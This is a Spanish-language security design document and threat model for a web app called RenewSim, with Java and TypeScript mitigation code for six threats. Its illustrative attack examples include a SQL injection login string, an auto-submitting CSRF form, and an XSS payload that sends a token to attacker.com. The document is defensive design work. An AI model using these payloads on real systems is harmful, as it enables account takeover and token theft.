# Diseño de Seguridad — RenewSim

## Modelo de Amenazas

### Amenaza 1: Credential Stuffing

**Descripción:** Atacante utiliza credenciales filtradas de brechas de seguridad de otros servicios (LinkedIn, Adobe, etc.) para intentar acceder a cuentas en RenewSim, asumiendo que los usuarios reutilizan contraseñas.

**Vector de ataque:** Listas de millones de pares email:password disponibles en la dark web. Bots automatizados prueban credenciales en paralelo.

**Impacto:** Crítico — acceso no autorizado a cuentas, exposición de simulaciones con datos sensibles de proyectos energéticos.

**Mitigaciones implementadas:**
1. **2FA obligatorio con OTP email**: Incluso con la contraseña correcta, el atacante necesita acceso al email de la víctima
2. **Rate limiting en login paso 1**: 5 intentos fallidos → bloqueo 15 minutos por email
3. **Rate limiting global por IP**: 20 intentos/minuto → bloqueo temporal de IP

**Implementación:**
```java
@Component
public class LoginRateLimiter {
    private final Cache<String, Integer> attemptsByEmail =
        Caffeine.newBuilder()
            .expireAfterWrite(15, TimeUnit.MINUTES)
            .build();

    public void recordFailedAttempt(String email) {
        int attempts = attemptsByEmail.get(email, k -> 0) + 1;
        attemptsByEmail.put(email, attempts);
        if (attempts >= 5) {
            throw new RateLimitExceededException(
                "Account temporarily locked. Retry after 15 minutes."
            );
        }
    }

    public void resetAttempts(String email) {
        attemptsByEmail.invalidate(email);
    }
}
```

---

### Amenaza 2: Brute Force en Código OTP

**Descripción:** Atacante intenta adivinar el código OTP de 6 dígitos generado en el paso 1 del login 2FA.

**Vector de ataque:** Espacio de búsqueda de 1.000.000 combinaciones (000000–999999). Bot envía requests automatizados al endpoint `/auth/login/step2`.

**Impacto:** Alto — si el atacante tiene credenciales válidas (phishing, keylogger) y adivina el OTP, accede completamente a la cuenta.

**Mitigaciones implementadas:**
1. **Límite de intentos OTP**: 3 intentos fallidos → invalidar OTP + bloqueo 15 minutos
2. **Expiración corta**: OTP válido solo 5 minutos (reduce ventana de ataque a ~300 intentos máximo)
3. **Uso único**: OTP marcado como `used=true` tras validación exitosa
4. **OTP hasheado en BD**: Imposible leer códigos válidos desde base de datos comprometida

**Implementación:**
```java
@Service
public class OtpService {

    public void validateOtp(String email, String otpCode) {
        User user = userRepository.findByEmail(email)
            .orElseThrow(() -> new InvalidOtpException("Invalid OTP"));

        OtpCode otp = otpRepository.findActiveOtp(user.getId())
            .orElseThrow(() -> new OtpExpiredException("OTP expired or not found"));

        if (otp.isExpired()) {
            throw new OtpExpiredException("OTP has expired");
        }

        if (!BCrypt.checkpw(otpCode, otp.getCodeHash())) {
            int attempts = incrementOtpAttempts(user.getId());
            if (attempts >= 3) {
                otpRepository.markInvalid(otp.getId());
                throw new OtpBlockedException(
                    "Too many failed OTP attempts. Account locked for 15 minutes."
                );
            }
            throw new InvalidOtpException(
                "Invalid OTP code. Remaining attempts: " + (3 - attempts)
            );
        }

        otpRepository.markUsed(otp.getId());
        resetOtpAttempts(user.getId());
    }
}
```

---

### Amenaza 3: Token Hijacking (Robo de JWT)

**Descripción:** Atacante intercepta o roba el access token JWT mediante XSS, MITM (sin HTTPS) o malware local.

**Impacto:** Alto — con un access token válido, el atacante puede hacer requests autenticados durante 1 hora.

**Mitigaciones implementadas:**
1. **Access token en memoria (no localStorage)**: Tokens no persisten al cerrar pestaña, no accesibles por XSS
2. **Refresh token en cookie HttpOnly**: JavaScript no puede acceder al refresh token
3. **HTTPS obligatorio**: Header `Strict-Transport-Security` fuerza HTTPS en producción
4. **Expiración corta de access token**: 1 hora limita la ventana de ataque
5. **JTI blacklist**: Logout inmediato invalida el token sin esperar expiración natural
6. **CSP headers**: Content-Security-Policy previene ejecución de scripts maliciosos

**Implementación (frontend):**
```typescript
// authStore.ts — Access token SOLO en memoria (Zustand)
export const useAuthStore = create<AuthState>((set) => ({
  accessToken: null,  // En memoria, se pierde al refrescar página
  user: null,
  isAuthenticated: false,
  setTokens: (accessToken, user) =>
    set({ accessToken, user, isAuthenticated: true }),
  clearAuth: () =>
    set({ accessToken: null, user: null, isAuthenticated: false }),
}));
```

**Implementación (backend — cookie HttpOnly):**
```java
@PostMapping("/auth/login/step2")
public ResponseEntity<AuthResponse> loginStep2(
        @RequestBody LoginStep2Request req,
        HttpServletResponse response) {
    AuthResult result = authService.step2(req.email(), req.otpCode());

    // Refresh token como cookie HttpOnly — JavaScript no puede acceder
    ResponseCookie cookie = ResponseCookie.from("refreshToken", result.refreshToken())
        .httpOnly(true)
        .secure(true)           // Solo HTTPS
        .sameSite("Strict")     // No se envía en requests cross-site
        .path("/api/v1/auth/refresh")
        .maxAge(Duration.ofDays(7))
        .build();
    response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());

    // Access token en body — el frontend lo guarda en memoria
    return ResponseEntity.ok(new AuthResponse(result.accessToken(), result.user()));
}
```

---

### Amenaza 4: SQL Injection

**Descripción:** Atacante inyecta código SQL malicioso en parámetros de entrada para extraer datos, modificar registros o escalar privilegios.

**Ejemplo de ataque:**
```
POST /api/v1/auth/login/step1
{ "email": "admin@example.com' OR '1'='1", "password": "x" }
```

**Impacto:** Crítico — exposición de toda la base de datos, pérdida de integridad de datos.

**Mitigaciones implementadas:**
1. **JPA + PreparedStatements**: Todas las queries usan parámetros vinculados (no concatenación de strings)
2. **Validación de entrada**: DTOs con `@Email`, `@NotBlank`, `@Pattern`, `@Size`
3. **ORM abstraction**: Spring Data JPA previene SQL directo en la mayoría de casos

**Implementación:**
```java
// CORRECTO — JPA con parámetros vinculados (previene SQL injection)
@Query("SELECT u FROM UserEntity u WHERE u.email = :email")
Optional<UserEntity> findByEmail(@Param("email") String email);

// INCORRECTO — vulnerable a SQL injection (nunca hacer esto)
// @Query(value = "SELECT * FROM users WHERE email = '" + email + "'", nativeQuery = true)

// Validación en DTO
public record LoginStep1Request(
    @NotBlank @Email String email,
    @NotBlank @Size(min = 8, max = 100) String password
) {}
```

---

### Amenaza 5: Cross-Site Scripting (XSS)

**Descripción:** Atacante inyecta JavaScript malicioso en campos de entrada (nombre de simulación, mensajes de chat IA) que se ejecuta en el navegador de otros usuarios.

**Ejemplo de ataque:**
```json
{
  "name": "<script>fetch('https://attacker.com?t='+sessionStorage.getItem('token'))</script>"
}
```

**Impacto:** Alto — robo de tokens, redirección a sitios maliciosos, ejecución de acciones no autorizadas.

**Mitigaciones implementadas:**
1. **React auto-escaping**: React escapa automáticamente todo contenido en `{variable}`
2. **CSP headers**: `Content-Security-Policy` bloquea scripts inline y fuentes no autorizadas
3. **No `dangerouslySetInnerHTML`** salvo con sanitización explícita (DOMPurify)
4. **Access token en memoria**: Incluso si XSS ocurre, no hay token en localStorage para robar

**Implementación (frontend):**
```tsx
// React escapa automáticamente — seguro
<h1>{simulation.name}</h1>

// Markdown del chat con sanitización
import ReactMarkdown from 'react-markdown';
import rehypeSanitize from 'rehype-sanitize';

<ReactMarkdown rehypePlugins={[rehypeSanitize]}>
  {chatMessage.content}
</ReactMarkdown>
```

**Implementación (backend — CSP header):**
```java
// SecurityHeadersFilter.java
response.setHeader("Content-Security-Policy",
    "default-src 'self'; " +
    "script-src 'self'; " +
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:; " +
    "connect-src 'self'; " +
    "frame-ancestors 'none';"
);
```

---

### Amenaza 6: Cross-Site Request Forgery (CSRF)

**Descripción:** Atacante engaña a un usuario autenticado para que ejecute acciones no deseadas mediante un sitio malicioso que envía requests al backend de RenewSim.

**Ejemplo de ataque:**
```html
<!-- En sitio malicioso -->
<form action="https://api.renewsim.com/api/v1/simulations/42" method="POST">
  <input type="hidden" name="name" value="Hackeado">
</form>
<script>document.forms[0].submit();</script>
```

**Impacto:** Medio — acciones no autorizadas en nombre del usuario (delete simulaciones, cambio de perfil).

**Mitigaciones implementadas:**
1. **JWT en header Authorization**: CSRF solo funciona con cookies automáticas; JWT requiere JavaScript explícito para inyectarlo
2. **SameSite=Strict en refresh token cookie**: No se envía en requests cross-site
3. **CORS estricto**: Backend solo acepta requests desde el dominio del frontend

**Implementación:**
```java
// SecurityConfig.java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .csrf(csrf -> csrf.disable()) // CSRF no necesario con JWT en header
        .cors(cors -> cors.configurationSource(corsConfigurationSource()))
        // ...
    return http.build();
}

@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOrigins(List.of(
        "https://renewsim.com",
        "https://www.renewsim.com"
    ));
    config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE", "OPTIONS"));
    config.setAllowedHeaders(List.of("Authorization", "Content-Type"));
    config.setAllowCredentials(true); // Permite cookies HttpOnly
    config.setMaxAge(3600L);

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/api/**", config);
    return source;
}
```

---

## Resumen de Mitigaciones

| Amenaza | Severidad | Mitigaciones | Riesgo Residual |
|---------|-----------|--------------|-----------------|
| Credential Stuffing | Crítico | 2FA obligatorio + rate limiting | Bajo |
| Brute Force OTP | Alto | 3 intentos máx + expiración 5 min + hash | Bajo |
| Token Hijacking | Alto | Memoria + HttpOnly + HTTPS + JTI blacklist | Medio |
| SQL Injection | Crítico | JPA PreparedStatements + validación | Muy bajo |
| XSS | Alto | React auto-escape + CSP + rehype-sanitize | Bajo |
| CSRF | Medio | JWT en header + SameSite + CORS estricto | Muy bajo |

---

## Configuración Spring Security

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(
            HttpSecurity http,
            JwtAuthenticationFilter jwtFilter) throws Exception {
        return http
            .sessionManagement(session ->
                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .csrf(csrf -> csrf.disable())
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            .authorizeHttpRequests(auth -> auth
                // Endpoints públicos
                .requestMatchers(
                    "/api/v1/auth/login/step1",
                    "/api/v1/auth/login/step2",
                    "/api/v1/auth/resend-otp",
                    "/api/v1/auth/refresh",
                    "/api/v1/users/register",
                    "/api/v1/users/activate",
                    "/api/v1/shared/**",
                    "/actuator/health"
                ).permitAll()
                // Solo ADMIN
                .requestMatchers(HttpMethod.POST, "/api/v1/roles").hasRole("ADMIN")
                .requestMatchers(HttpMethod.POST, "/api/v1/technologies").hasRole("ADMIN")
                .requestMatchers(HttpMethod.PUT, "/api/v1/technologies/**").hasRole("ADMIN")
                .requestMatchers(HttpMethod.DELETE, "/api/v1/technologies/**").hasRole("ADMIN")
                .requestMatchers("/api/v1/users/{userId}/roles/**").hasRole("ADMIN")
                // Resto requiere autenticación
                .anyRequest().authenticated()
            )
            .addFilterBefore(jwtFilter, UsernamePasswordAuthenticationFilter.class)
            .exceptionHandling(ex -> ex
                .authenticationEntryPoint(new HttpStatusEntryPoint(HttpStatus.UNAUTHORIZED))
                .accessDeniedHandler(new HttpStatusAccessDeniedHandler(HttpStatus.FORBIDDEN))
            )
            .headers(headers -> headers
                .frameOptions(frame -> frame.deny())
                .contentTypeOptions(Customizer.withDefaults())
                .httpStrictTransportSecurity(hsts -> hsts
                    .maxAgeInSeconds(31536000)
                    .includeSubDomains(true)
                )
            )
            .build();
    }
}
```

### JwtAuthenticationFilter

```java
@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {

    private final JwtTokenProvider jwtProvider;
    private final TokenBlacklistRepository blacklistRepo;

    @Override
    protected void doFilterInternal(
            HttpServletRequest request,
            HttpServletResponse response,
            FilterChain chain) throws ServletException, IOException {

        String token = extractToken(request);

        if (token != null && jwtProvider.validateToken(token)) {
            String jti = jwtProvider.extractJti(token);

            // Verificar blacklist (tokens invalidados por logout)
            if (!blacklistRepo.existsByJti(jti)) {
                String username = jwtProvider.extractUsername(token);
                List<String> roles = jwtProvider.extractRoles(token);

                UsernamePasswordAuthenticationToken auth =
                    new UsernamePasswordAuthenticationToken(
                        username,
                        null,
                        roles.stream()
                             .map(r -> new SimpleGrantedAuthority("ROLE_" + r))
                             .toList()
                    );
                auth.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
                SecurityContextHolder.getContext().setAuthentication(auth);
            }
        }

        chain.doFilter(request, response);
    }

    private String extractToken(HttpServletRequest request) {
        String header = request.getHeader("Authorization");
        if (header != null && header.startsWith("Bearer ")) {
            return header.substring(7);
        }
        return null;
    }
}
```
